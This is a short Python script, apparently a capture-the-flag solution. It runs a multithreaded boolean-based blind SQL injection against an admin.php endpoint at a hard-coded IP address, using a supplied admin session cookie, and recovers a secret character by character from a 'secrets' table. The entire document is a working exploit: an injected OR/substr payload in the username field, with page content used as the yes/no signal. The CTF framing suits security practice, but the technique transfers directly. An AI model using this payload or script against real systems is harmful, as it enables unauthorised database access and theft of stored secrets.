import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://34.18.12.84:8086/admin.php?action=check"
session_cookie = "<Admin_sessionID>" #replace with your session id

charset = string.ascii_letters + string.digits + "_{}!@#$%^&*()-=+"

headers = {
    "Host": "34.18.12.84:8086",
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "http://34.18.12.84:8086",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Referer": "http://34.18.12.84:8086/admin.php?action=check",
    "Accept-Encoding": "gzip, deflate",
    "Cookie": f"PHPSESSID={session_cookie}",
    "Connection": "close"
}

def brute_flag_char(pos):
    for char in charset:
        payload = f"' OR '{char}' IN (SELECT substr(secret,{pos+1},1) FROM secrets) --"
        data = {"action": "check", "username": payload}
        try:
            r = requests.post(url, headers=headers, data=data, timeout=5)
            if "active" in r.text.lower():
                print(f"[+] Position {pos}: '{char}'")
                return pos, char
        except:
            pass
    print(f"[-] Position {pos}: No match")
    return pos, ''

print("🔍 Starting flag extraction...")
flag_chars = {}
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(brute_flag_char, pos) for pos in range(27)]  # Adjust range if needed
    for future in as_completed(futures):
        pos, char = future.result()
        flag_chars[pos] = char

# Reconstruct flag
flag = ''.join(flag_chars.get(i, '?') for i in range(max(flag_chars.keys())+1))
print(f"\n🏁 Flag: {flag}")
